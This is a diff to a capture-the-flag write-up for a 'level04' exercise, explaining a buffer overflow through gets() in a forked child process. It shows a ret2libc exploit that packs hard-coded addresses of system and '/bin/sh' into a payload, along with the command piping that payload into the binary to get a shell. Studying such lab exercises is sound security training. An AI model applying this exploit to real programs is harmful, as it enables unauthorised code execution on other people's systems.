@@ -1,3 +1,11 @@
+* In this level04 the main() forks a child .
+* the child process request input using gets, which have no protection on the size of input that we provide. 
+* so we can simply run a buffer overflow attack . 
+* our buffer is 160 far from the return address.
+
+===> i solved this challenge in two ways : 
+
+
 
 ************************************** ret2libc *******************************************
 
@@ -10,6 +18,9 @@ system = struct.pack ("I", 0xf7e6aed0)
 bin_sh = struct.pack ("I", 0xf7f897ec)
 
 print padding + system + "AAAA" + bin_sh
+
+
+(echo $(python /tmp/pyload.py) ; cat ) | ./level04
 
 ************************************** shellcode *******************************************
 
